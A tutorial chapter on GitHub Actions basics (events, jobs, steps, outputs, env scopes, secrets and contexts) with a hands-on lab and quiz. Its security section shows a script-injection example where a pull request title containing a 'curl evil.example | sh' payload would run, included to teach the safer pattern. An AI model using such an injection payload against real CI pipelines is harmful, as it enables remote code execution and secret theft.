# Chapter 5: Core Features: Events, Jobs, Steps, Data and Secrets

> **Level:** beginner → intermediate · **Time:** 3–4 hours · **Prerequisites:** [Chapters 1](01_introduction.md) and [4](04_development_environment.md)
> **Next:** [Chapter 6: Advanced Features](06_advanced_features.md)

This is the most important chapter. Everything later builds on it. It is split into lessons; each ends with the key rule to remember. A single hands-on lab at the end ties them together.

## Learning objectives

After this chapter you can:

- Write a workflow with the top-level keys `name`, `on`, `permissions`, `env` and `jobs`.
- Choose and filter events: `push`, `pull_request`, `workflow_dispatch`, `schedule`.
- Order jobs with `needs`, and control steps and jobs with `if`.
- Pass data between steps and between jobs.
- Scope environment variables, and use secrets and variables correctly.
- Read contexts and expressions, and know where each context is available.
- Pass untrusted values to scripts safely.

## 1. Problem statement

A workflow file is a program written in a declarative language. To write one confidently you need a precise model of *when* it runs (events), *what* runs and in which order (jobs, steps, dependencies), *how data moves* between pieces (outputs, environment), and *what it is trusted with* (secrets, permissions). Guessing at these leads to workflows that run too often, never run, leak secrets, or silently skip steps.

## 2. Core explanation

### Lesson 5.1: The anatomy of a workflow file

```yaml
name: CI                    # display name (optional)

on:                         # events that start the workflow
  pull_request:
  push:
    branches: [main]

permissions:                # what the GITHUB_TOKEN may do (Chapter 6)
  contents: read

env:                        # workflow-wide environment variables
  NODE_ENV: test

defaults:                   # defaults for every run step
  run:
    shell: bash

concurrency:                # prevent overlapping runs (Chapter 6)
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:                       # the work
  test:
    runs-on: ubuntu-24.04
    timeout-minutes: 15     # safety net: default is 360
    steps:
      - uses: actions/checkout@v5
      - run: echo "tests would run here"
```

| Key | Purpose |
|---|---|
| `name` | Label in the UI. Defaults to the file path. |
| `on` | Required. One or more events, optionally filtered. |
| `permissions` | Limits the automatic `GITHUB_TOKEN`. Declare it explicitly (Chapter 6). |
| `env` | Environment variables visible to every job and step. |
| `defaults` | Default settings, for example the shell or working directory for `run:` steps. |
| `concurrency` | Groups runs so that only one runs (or only the newest) at a time. |
| `jobs` | Required. A map of job IDs to job definitions. |

Two small settings pay off immediately: `timeout-minutes` (a hung job otherwise runs until the platform limit) and an explicit `permissions` block.

**Rule:** workflow files are YAML; indentation is structure.

### Lesson 5.2: Steps: `run` versus `uses`

A step is **either** a shell command **or** an action call.

| | `run:` | `uses:` |
|---|---|---|
| Meaning | Run a command in a shell on the runner. | Call a packaged, reusable action. |
| Example | `run: npm test` | `uses: actions/setup-node@v4` |
| Inputs | Your command text; env via `env:` | `with:` key-value inputs |
| Best for | Project-specific commands | Common tasks (checkout, setup tools, caching) |

```yaml
steps:
  - uses: actions/checkout@v5          # action step
  - name: Install and test             # named command step
    run: |
      npm ci
      npm test
```

**Shells.** On Linux and macOS the default shell for `run:` is bash; on Windows it is PowerShell (`pwsh`). The documented values for `shell:` are `bash`, `pwsh`, `python`, `sh`, `cmd` and `powershell`. (`node` is **not** a built-in shell value; to run JavaScript inline, call `node` from bash or use `actions/github-script`.)

```yaml
- shell: python
  run: |
    import sys
    print(f"Python {sys.version_info.major}")
```

By default, GitHub runs bash steps with `-e` (stop on the first failing command), but a multi-line script can still hide failures inside pipelines. For scripts you care about, set strict mode explicitly:

```yaml
defaults:
  run:
    shell: bash --noprofile --norc -eo pipefail {0}
```

**Action versions.** `uses: owner/repo@ref` where `ref` is a tag, branch or commit SHA. Branches move constantly; tags can be moved by the owner; a full commit SHA cannot change. Chapter 7 explains pinning. Examples in this guide use major version tags such as `@v5` for readability.

**Rule:** a step is `run` or `uses`, never both.

### Lesson 5.3: Jobs, parallelism and `needs`

Jobs in a workflow run **in parallel by default**, each on its own runner. Steps inside a job run **sequentially**, sharing one filesystem and environment.

```yaml
jobs:
  lint:
    runs-on: ubuntu-24.04
    steps: [{ run: echo lint }]
  unit:
    runs-on: ubuntu-24.04
    steps: [{ run: echo unit }]
  deploy:
    needs: [lint, unit]        # wait for both
    runs-on: ubuntu-24.04
    steps: [{ run: echo deploy }]
```

```
lint ──┐
       ├──▶ deploy
unit ──┘
```

`needs` builds a directed acyclic graph: no cycles are allowed (job A cannot need B while B needs A). Valid shapes are linear, fan-out, fan-in and diamond.

**What happens when a needed job fails?** The dependent job is **skipped**, unless it uses an `if:` such as `always()` that overrides the default.

| Concept | `needs:` | `if:` |
|---|---|---|
| Question answered | "In what order?" | "Should this run at all?" |
| Effect | Creates a dependency and passes outputs. | Evaluates an expression and skips the job or step when false. |
| Failure behavior | A failed dependency skips this job by default. | `if: always()` or `if: failure()` can run it anyway. |
| Use together | Yes: `needs: build` plus `if: github.ref == 'refs/heads/main'`. | |

| Concept | Job | Step |
|---|---|---|
| Runs on | Its own runner | The runner of its job |
| Parallel by default? | Yes | No, sequential |
| Shares filesystem? | No | Yes |

**Rule:** parallel by default; `needs` orders; a failure skips what depends on it.

### Lesson 5.4: Events: when does a workflow run?

| Event | Fires when | Typical use |
|---|---|---|
| `push` | Commits are pushed to a branch or a tag is pushed | Test the main branch, release on tags |
| `pull_request` | A PR is opened, updated or reopened (default types) | Validate proposed changes |
| `workflow_dispatch` | Someone starts it manually (UI, CLI, API) | Deployments, maintenance, learning |
| `schedule` | A cron time arrives (UTC) | Nightly builds, cleanups |
| `workflow_call` | Another workflow calls it | Reusable workflows (Chapter 8) |
| `release`, `issues`, `workflow_run` and many more | See the events reference | Repository automation |

#### `push` versus `pull_request`

| | `push` | `pull_request` |
|---|---|---|
| Runs for | A pushed commit on a branch/tag | A pull request |
| Code checked out | The pushed commit | A **merge commit** of the PR into its base branch (by default) |
| From forks | Not applicable | Runs with a read-only token and **no secrets** |
| Typical filter | `branches: [main]` | Paths and `types:` |

Triggering on both `push` and `pull_request` for the same branch runs twice for a PR whose branch is in the same repository. A common pattern is `pull_request` for everything plus `push` only to `main`.

#### Filters

```yaml
on:
  push:
    branches:
      - main
      - 'release/**'       # glob
    tags:
      - 'v*'
  pull_request:
    types: [opened, synchronize, reopened, ready_for_review]
    paths:
      - 'src/**'
      - '!src/**/*.md'     # '!' excludes; order matters
  schedule:
    - cron: '0 2 * * *'    # 02:00 UTC daily
  workflow_dispatch:
    inputs:
      environment:
        description: Where to deploy
        type: choice
        options: [staging, production]
        required: true
```

Rules worth knowing:

- **Glob patterns** are used for branches, tags and paths. `*` matches within one path segment and **does not match `/`**; `**` matches across segments. A tag such as `services/api@1.2.3` therefore needs a pattern like `'**@*'`, not `'*@*'`. Consult the filter pattern cheat sheet in the workflow syntax reference for the full list.
- **Path filters are not evaluated for pushes of tags.** If you filter a `push` by `paths` and also want tag pushes, do not rely on paths for the tag case.
- When you use more than one filter (for example `branches` and `paths`), **all** must match.
- Using both `branches` and `branches-ignore` for the same event is not allowed; use `!` patterns instead.
- **Duplicate keys are a bug.** Writing `push:` twice under `on:` makes one definition disappear or the file invalid. Put all `push` settings (branches, paths, tags) under a single `push:`.

**Cron.** The format is `minute hour day-of-month month day-of-week`, always in **UTC**. Scheduled workflows run only from the default branch's version of the file, can be delayed during busy periods, and in public repositories GitHub disables scheduled workflows after a long period without repository activity.

**Manual runs.** A `workflow_dispatch` workflow appears in the UI only if the file exists on the default branch. Inputs are available as `${{ inputs.name }}`.

**Rule:** choose the narrowest event and filters that meet the need; one key per event.

### Lesson 5.5: Environment variables and their scopes

You can declare `env:` at three levels. A narrower scope overrides a wider one.

```yaml
env:
  WORKFLOW_VAR: workflow            # all jobs, all steps
jobs:
  one:
    runs-on: ubuntu-24.04
    env:
      JOB_VAR: job                  # all steps of this job
    steps:
      - env:
          STEP_VAR: step            # this step only
        run: echo "$WORKFLOW_VAR $JOB_VAR $STEP_VAR"
      - run: echo "$WORKFLOW_VAR $JOB_VAR [$STEP_VAR]"   # STEP_VAR empty
  two:
    runs-on: ubuntu-24.04
    steps:
      - run: echo "$WORKFLOW_VAR [$JOB_VAR] [$STEP_VAR]"  # only workflow-level visible
```

| Variable | Step 1 of job `one` | Step 2 of job `one` | Job `two` |
|---|---|---|---|
| `WORKFLOW_VAR` | yes | yes | yes |
| `JOB_VAR` | yes | yes | no |
| `STEP_VAR` | yes | no | no |

Use the narrowest scope that works. GitHub also provides many **default variables** (`GITHUB_REPOSITORY`, `GITHUB_SHA`, `GITHUB_REF_NAME`, `RUNNER_OS`, ...).

#### `env`, `vars` and `secrets` compared

| | `env` | `vars` (configuration variables) | `secrets` |
|---|---|---|---|
| Defined | In the workflow file | In repository, environment or organization settings | In repository, environment or organization settings |
| Sensitive? | No. In your Git history. | No. Visible to people with access to settings; shown in logs | Yes. Encrypted; masked in logs |
| Access syntax | `$NAME` in the shell, `${{ env.NAME }}` | `${{ vars.NAME }}` | `${{ secrets.NAME }}` |
| Use for | Constants tied to the workflow | Non-secret settings that differ per repo or environment (region, hostnames) | Passwords, tokens, keys |

**Rule:** narrowest scope; configuration that is not secret goes in `vars`, anything sensitive in `secrets`.

### Lesson 5.6: Passing data between steps and between jobs

Steps share a filesystem and the environment of their job, but shell variables from one step do not exist in the next (each step is a new shell process). GitHub provides **file-based commands** for passing data. Write `key=value` lines to the file whose path is in an environment variable:

| Target | Write to | Read as |
|---|---|---|
| Step output | `$GITHUB_OUTPUT` | `${{ steps.<id>.outputs.<key> }}` |
| Environment variable for later steps | `$GITHUB_ENV` | `$KEY` in later steps |
| Add to `PATH` | `$GITHUB_PATH` | automatic in later steps |
| Markdown shown on the run page | `$GITHUB_STEP_SUMMARY` | on the run summary |

(The older `::set-output` and `::set-env` log commands are deprecated and no longer documented; use the files.)

```yaml
steps:
  - id: version                    # id is required to read outputs
    run: echo "value=1.2.3" >> "$GITHUB_OUTPUT"
  - run: echo "Version is ${{ steps.version.outputs.value }}"
  - run: echo "FOO=bar" >> "$GITHUB_ENV"
  - run: echo "FOO is $FOO"
```

**Multi-line values** need a delimiter:

```bash
{
  echo "notes<<EOF"
  git log -5 --pretty='- %s'
  echo "EOF"
} >> "$GITHUB_OUTPUT"
```

**Between jobs**, each job runs on a different machine, so nothing in the shell, environment or filesystem carries over. You must:

1. expose a step output as a **job output** (`outputs:`), then
2. declare `needs:` on the producer, then
3. read `${{ needs.<job>.outputs.<key> }}`.

```yaml
jobs:
  producer:
    runs-on: ubuntu-24.04
    outputs:
      tag: ${{ steps.t.outputs.tag }}
    steps:
      - id: t
        run: echo "tag=v1.2.3" >> "$GITHUB_OUTPUT"
  consumer:
    needs: producer
    runs-on: ubuntu-24.04
    steps:
      - run: echo "Using ${{ needs.producer.outputs.tag }}"
```

Outputs are **strings** and are meant for small values (versions, tags, JSON lists). To pass **files** between jobs, use artifacts (Chapter 6). A job in a matrix cannot give each matrix leg its own output under one name; the last leg to write wins, so use artifacts or a different design for per-leg data.

| Mechanism | Scope | Good for |
|---|---|---|
| Step output (`GITHUB_OUTPUT`) | Later steps in the same job | Small values, structured decisions |
| `GITHUB_ENV` | Later steps in the same job | Variables used by many later commands |
| Job output | Dependent jobs | Small values |
| Artifact | Other jobs, later runs, humans | Files |
| Cache | Later runs | Rebuildable dependencies |

**Rule:** data crosses a job boundary only through outputs or artifacts.

### Lesson 5.7: Secrets and variables

Create them under **Settings → Secrets and variables → Actions**, at three levels:

| Level | Visible to | Use for |
|---|---|---|
| **Repository** | Workflows in that repository | Most secrets |
| **Organization** | Selected repositories | Shared credentials (limit the repositories) |
| **Environment** | Only jobs that declare `environment: <name>` | Per-stage values (staging vs production), optionally gated by required reviewers |

```yaml
jobs:
  deploy-staging:
    runs-on: ubuntu-24.04
    environment: staging          # selects staging's secrets and vars
    steps:
      - env:
          API_TOKEN: ${{ secrets.API_TOKEN }}     # same name, different value per environment
        run: ./deploy.sh
```

GitHub **masks** secret values in logs, but masking is only a safety net:

- It matches the exact value. Transformed values (base64-encoded, URL-encoded, split across lines, or shortened) may **not** be masked.
- Secrets passed as structured data (a whole JSON blob) mask poorly; store each value as its own secret.
- Anyone who can modify the workflow on a branch that runs with secrets can print them. Protect branches and review workflow changes.

**Never** hard-code credentials, and never commit a `.env` containing real values.

| | Repository secret | Environment secret |
|---|---|---|
| Available to | Any job in the repository (subject to branch rules) | Only jobs that reference the environment |
| Protection rules | None | Required reviewers, wait timers, branch restrictions |
| Same name, different values? | No | Yes, per environment |

**Rule:** secrets live in settings, scoped as narrowly as possible, and are passed to the one step that needs them via `env:`.

### Lesson 5.8: Contexts, expressions and conditions

`${{ ... }}` evaluates an **expression** using **contexts**: objects holding data about the run.

| Context | Holds | Example |
|---|---|---|
| `github` | Repository, event, ref, SHA, actor | `${{ github.ref_name }}` |
| `env` | Environment variables set via `env:` | `${{ env.NODE_ENV }}` |
| `vars` | Configuration variables | `${{ vars.REGION }}` |
| `secrets` | Secrets | `${{ secrets.API_TOKEN }}` |
| `inputs` | Inputs of `workflow_dispatch` / `workflow_call` | `${{ inputs.environment }}` |
| `steps` | Outputs and status of earlier steps | `${{ steps.build.outputs.tag }}` |
| `needs` | Outputs and results of required jobs | `${{ needs.build.result }}` |
| `matrix`, `strategy` | Current matrix values (Chapter 6) | `${{ matrix.node }}` |
| `runner` | Runner OS, architecture, temp dir | `${{ runner.os }}` |
| `job` | Information about the current job | `${{ job.status }}` |

**Context availability.** Not every context is available everywhere. Notably, the `secrets` context is **not** available in the `if:` of a job or a step. This does **not** work:

```yaml
# Broken: secrets cannot be used in `if`
- if: ${{ secrets.DEPLOY_KEY != '' }}
  run: ./deploy.sh
```

Copy the secret into an environment variable and test that instead:

```yaml
jobs:
  deploy:
    runs-on: ubuntu-24.04
    env:
      HAS_KEY: ${{ secrets.DEPLOY_KEY != '' }}
    steps:
      - if: env.HAS_KEY == 'true'
        run: ./deploy.sh
```

The [contexts reference](https://docs.github.com/en/actions/reference/workflows-and-actions/contexts) lists exactly which contexts each key accepts.

**Conditions** use `if:`. The `${{ }}` wrapper is optional there.

| Function | True when |
|---|---|
| `success()` | All previous steps succeeded (the default for steps) |
| `failure()` | A previous step failed |
| `always()` | Always, even after cancellation (use with care) |
| `cancelled()` | The run was cancelled |

```yaml
- if: github.ref == 'refs/heads/main' && github.event_name == 'push'
  run: echo "main branch push"
- if: failure()
  run: echo "something earlier failed"
- if: ${{ !cancelled() }}      # run even after failure, but not after cancel
  run: echo "cleanup"
```

Other useful functions: `contains()`, `startsWith()`, `endsWith()`, `format()`, `join()`, `toJSON()`, `fromJSON()`, `hashFiles()`. To inspect a context while learning, print it, but never for `secrets`:

```yaml
- run: echo '${{ toJSON(github.event) }}'   # fine for learning; remove afterwards
```

**Rule:** check *where* a context is allowed; never test secrets in `if`.

## 3. Mental model

A workflow is **a recipe card handed to a kitchen full of cooks**. The event is the order slip. Each job is a separate cook with their own bench (a fresh runner); steps are the numbered instructions each cook follows in order at their own bench. Cooks cannot see each other's benches. To hand something over, they put a note on the pass (an output) or send a plate (an artifact). The head chef's rule sheet (permissions) says what each cook may touch, and the locked cabinet (secrets) is opened only for the cook who needs it.

## 4. Syntax breakdown

The lab workflow below, annotated.

| Part | What it demonstrates |
|---|---|
| `on.workflow_dispatch.inputs` | Typed manual inputs: a string and a boolean |
| Top-level `env` and `permissions` | Workflow-wide variable; least-privilege token |
| Job `produce` with `outputs:` | Exposing a step output to other jobs |
| `env: GREETING: ${{ inputs.greeting }}` | Passing an untrusted value through the environment rather than into the script text |
| Job `consume` with `needs: produce` | Ordering and reading `needs.produce.outputs.message` |
| `if: ${{ inputs.fail }}` | A conditional step |
| `if: failure()` | A step that runs only after a failure |
| Job `summary` with `if: always()` | A job that runs even when a dependency failed |

## 5. Practical example

Save as `.github/workflows/core-lab.yml`:

```yaml
name: Core Lab

on:
  workflow_dispatch:
    inputs:
      greeting:
        description: Word to greet with
        required: true
        default: Hello
        type: string
      fail:
        description: Make the consume job fail
        required: false
        default: false
        type: boolean

permissions:
  contents: read

env:
  WORKFLOW_VAR: workflow-level

jobs:
  produce:
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    env:
      JOB_VAR: job-level
    outputs:
      message: ${{ steps.build.outputs.message }}
    steps:
      - name: Build a message
        id: build
        env:
          STEP_VAR: step-level
          GREETING: ${{ inputs.greeting }}
        run: |
          echo "message=${GREETING} from ${WORKFLOW_VAR}/${JOB_VAR}/${STEP_VAR}" >> "$GITHUB_OUTPUT"
      - name: STEP_VAR is not visible here
        run: echo "STEP_VAR is '${STEP_VAR:-<unset>}'"

  consume:
    needs: produce
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    steps:
      - name: Read the produced message
        env:
          MESSAGE: ${{ needs.produce.outputs.message }}
        run: echo "$MESSAGE"
      - name: Optionally fail
        if: ${{ inputs.fail }}
        run: exit 1
      - name: Runs only if everything before succeeded
        run: echo "all good so far"
      - name: Runs only after a failure
        if: failure()
        run: echo "something failed earlier in this job"

  summary:
    needs: [produce, consume]
    if: always()
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    steps:
      - name: Report
        run: echo "consume finished with result ${{ needs.consume.result }}"
```

## 6. Execution walkthrough

Run it with `greeting=Hi` and `fail=false`:

1. You dispatch the workflow. GitHub creates three jobs. `produce` has no `needs`, so it starts immediately on a fresh runner. `consume` and `summary` wait.
2. In `produce`, the step `build` writes `message=Hi from workflow-level/job-level/step-level` to `$GITHUB_OUTPUT`. The next step shows `STEP_VAR` is unset, because step-scoped variables end with the step.
3. The job output `message` copies the step output so other jobs can read it. `produce` finishes and its runner is discarded.
4. `consume` starts on a **different** runner. It receives the output string through `needs.produce.outputs.message` and prints it. `fail` is false, so the optional step is skipped; the success step runs; the `failure()` step is skipped.
5. `summary` runs after both finish and prints `result success`.

Now run again with `fail=true`:

1. `consume` prints the message, then the "Optionally fail" step exits 1. The job is marked failed.
2. The step "Runs only if everything before succeeded" is **skipped** (its implicit condition is `success()`), but the `failure()` step **runs**.
3. `summary` still runs because of `if: always()`, and prints `result failure`. The workflow run is red.

## 7. Common mistakes

| Mistake | What happens | Fix |
|---|---|---|
| `if: secrets.X != ''` | Invalid: `secrets` is not available in `if` | Put the secret in an `env:` value and test that |
| Reading `${{ steps.x.outputs.y }}` without `id: x` | Empty value | Give the step an `id` |
| Reading another job's output without `needs:` | The output is unavailable | Add `needs:` |
| `echo "FOO=bar" >> $GITHUB_ENV` and reading `$FOO` in the *same* step | Not set yet | It is visible only to *later* steps |
| Two `push:` keys under `on:` | One is lost or the file is invalid | Merge into one `push:` block |
| `paths:` on `push` plus tags | Path filters are not evaluated for tags | Handle tag releases in their own trigger |
| Writing cron in local time | Runs at a UTC time | Convert to UTC |
| Expecting shell state to persist between steps | Each step is a new shell | Use `GITHUB_ENV`/`GITHUB_OUTPUT` or put commands in one step |
| Using `shell: node` | Not a documented built-in shell | Call `node script.js` from bash |
| Hard-coding a password in `env:` | It is in Git history forever | Use `secrets` and rotate the leaked value |

## 8. Security considerations

**Script injection.** `${{ ... }}` is replaced *before* the shell sees the script. If the value is attacker-controlled (a pull request title, a branch name, an issue body, a tag name, a manual input), they can inject commands:

```yaml
# Vulnerable: a PR titled  "; curl evil.example | sh #  is executed
- run: echo "Title is ${{ github.event.pull_request.title }}"
```

```yaml
# Safer: pass the value via the environment; the shell treats it as data
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title is $TITLE"
```

Apply the same rule to `github.head_ref`, `github.ref_name` (tags and branch names are user-chosen), `github.event.*` text fields and workflow inputs. This is why the lab passes `GREETING` and `MESSAGE` through `env:`.

Also:

- Writing untrusted values to `$GITHUB_OUTPUT` or `$GITHUB_ENV` can inject extra lines (a value containing a newline can set other variables). Use delimiters or validate input.
- Pull requests from forks run without secrets and with a read-only token by design; do not weaken that without understanding Chapter 11.
- Do not print secrets. Do not `echo` them "to test".
- Declare `permissions:` at the top of every workflow (Chapter 6).

## 9. Hands-on exercise

**Goal:** run the lab and observe each concept.

**Setup:** use your practice repository (never a real project).

1. Create a branch and add the workflow:
   ```bash
   git checkout -b core-lab
   # create .github/workflows/core-lab.yml with the example above
   actionlint
   git add .github/workflows/core-lab.yml
   git commit -m "Add core lab workflow"
   git push -u origin core-lab
   ```
2. Open a pull request and merge it so the workflow exists on the default branch (needed for the manual **Run workflow** button).
3. Run it:
   ```bash
   gh workflow run core-lab.yml -f greeting=Hi -f fail=false
   gh run watch
   ```
4. Open the run and expand each job. Find the message printed by `consume`, and the `<unset>` line.
5. Run again with `-f fail=true` and compare which steps ran or were skipped.

**Change-it tasks (each on a new branch):**

- Add a fourth job `notify` with `needs: summary` and `if: needs.consume.result == 'failure'`. Predict when it runs, then verify.
- Change `summary`'s `if:` to `success()` and re-run with `fail=true`. Predict, then observe.
- Add a `schedule` trigger and explain what time it fires in your time zone.

**Why this matters:** you observe the default parallelism, skip semantics, output passing and scopes directly.

**What success looks like:** with `fail=false`, all jobs are green and the message is printed. With `fail=true`, the run is red, `consume` shows a skipped step and a run `failure()` step, and `summary` is still green.

**If it fails:** `gh workflow run` says the workflow was not found → the file is not on the default branch yet. YAML error banner → run `actionlint`. A job is skipped unexpectedly → read its `needs` and `if` and check the result of the job it depends on.

## 10. Verification checklist

- [ ] `actionlint` reports no problems.
- [ ] The output string reaches `consume` through `needs.produce.outputs.message`.
- [ ] You saw `STEP_VAR is '<unset>'`.
- [ ] With `fail=true`, the `failure()` step ran and the normal step was skipped.
- [ ] `summary` ran in both cases.
- [ ] No secret or token value appears in any log.

## 11. Knowledge check

1. Do jobs run in parallel or in sequence by default? And steps?
2. What is the difference between `needs` and `if`?
3. Why can the second job not read `$FOO` set with `>> $GITHUB_ENV` in the first job?
4. Why is `echo "${{ github.event.issue.title }}"` in a `run:` step dangerous, and what is the safer form?
5. Which of `env`, `vars` and `secrets` would you use for a deployment region? For a database password?
6. Why does `if: secrets.TOKEN != ''` fail, and how do you work around it?
7. A tag filter `tags: ['*@1.*']` does not match `services/api@1.2.0`. Why?

<details>
<summary>Answers</summary>

1. Jobs: parallel. Steps: sequential.
2. `needs` orders jobs and passes outputs; `if` decides whether to run. A failed dependency skips the job unless `if` overrides.
3. Different jobs run on different machines; environment does not carry over. Use job outputs or artifacts.
4. The text is substituted into the script before the shell runs, so it can inject commands. Pass it via `env:` and use `"$TITLE"`.
5. Region: `vars`. Password: `secrets`.
6. The `secrets` context is not available in `if`. Copy to an `env` value and test that.
7. `*` does not match `/`; use `'**@1.*'`.
</details>

## 12. Key takeaways

- Event → workflow → jobs (parallel, own runner) → steps (sequential, shared filesystem).
- `needs` orders; `if` decides; failure skips dependents unless overridden.
- Data crosses job boundaries only via outputs (small strings) and artifacts (files).
- Narrow scopes for variables; sensitive values only in `secrets`, passed to the single step that needs them.
- Check where a context is allowed. Pass untrusted text through `env:`, never inline into scripts.
- Declare `permissions` and `timeout-minutes` in every workflow.

## Sources and further reading

- Original notes: `git show master:05_core_features.md`. Corrections made: the `node` shell value, `secrets` in `if:`, duplicated `push:` triggers, and an ambiguous default-permissions statement; added injection guidance, glob rules, and the manual-run/default-branch note. The `actions/hello-world-javascript-action@main` example was dropped because it pinned a branch.
- Official docs: [Workflow syntax](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax) (events, filters, shells, `if`) · [Contexts](https://docs.github.com/en/actions/reference/workflows-and-actions/contexts) (including availability) · [Workflow commands](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands) (`GITHUB_OUTPUT`, `GITHUB_ENV`, `GITHUB_PATH`, `GITHUB_STEP_SUMMARY`)
